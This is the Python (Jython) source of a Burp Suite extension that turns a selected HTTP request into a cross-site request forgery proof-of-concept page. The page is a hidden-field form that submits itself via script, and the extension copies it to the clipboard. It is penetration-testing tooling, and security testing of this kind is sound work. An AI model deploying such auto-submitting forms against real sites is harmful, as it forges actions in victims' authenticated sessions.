from burp import IBurpExtender, IRequestInfo, IContextMenuFactory
from java.io import PrintWriter
from java.lang import RuntimeException
from javax.swing import JMenu, JMenuItem
from java.awt import Toolkit
from java.awt.datatransfer import Clipboard
from java.awt.datatransfer import StringSelection


class BurpExtender(IBurpExtender, IRequestInfo, IContextMenuFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._actionName = "PoC generator"
        self._helers = callbacks.getHelpers()
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("PoC generator")
        callbacks.registerContextMenuFactory(self)

        # obtain our output and error streams
        self._stdout = PrintWriter(callbacks.getStdout(), True)
        self._stderr = PrintWriter(callbacks.getStderr(), True)

        # write a message to the Burp alerts tab
        callbacks.issueAlert("Installed PoC generator")

    def createMenuItems(self, invocation):
        menu = JMenu(self._actionName)
        responses = invocation.getSelectedMessages()
        if len(responses) == 1:
            menu.add(
                JMenuItem(
                    "CSRF",
                    None,
                    actionPerformed=lambda x, inv=invocation: self.Action(inv),
                )
            )
            return [menu]

    def Action(self, invocation):
        try:
            http_traffic = invocation.getSelectedMessages()
            req = http_traffic.pop()
            analyzedRequest = self._helpers.analyzeRequest(req)
            url = analyzedRequest.getUrl()
            method = analyzedRequest.getMethod()
            params = analyzedRequest.getParameters()

            # generate PoC
            poc_html = self.generatePoc(url, method, params)

            # copy to clipboard
            kit = Toolkit.getDefaultToolkit()
            clip = kit.getSystemClipboard()

            ss = StringSelection(poc_html)
            clip.setContents(ss, None)

        except Exception as e:
            self._stderr.println(e)

    def generatePoc(self, url, method, params):
        try:
            param_tags = ""
            for p in params:
                param_tags += '<input type=hidden name="{}" value="{}" />\n'.format(
                    p.getName(), p.getValue()
                )
            html_template = """
<html>
    <body>
        <form action="{url}" method="{method}">
            {param_tags}
            <input type="submit" name="poc_auto_submit"/>
        </form>
        <script>document.forms[0].poc_auto_submit.click()</script>
    </body>
 </html>
            """.format(
                url=url, method=method, param_tags=param_tags
            )

        except Exception as e:
            self._stderr.println(e)

        return html_template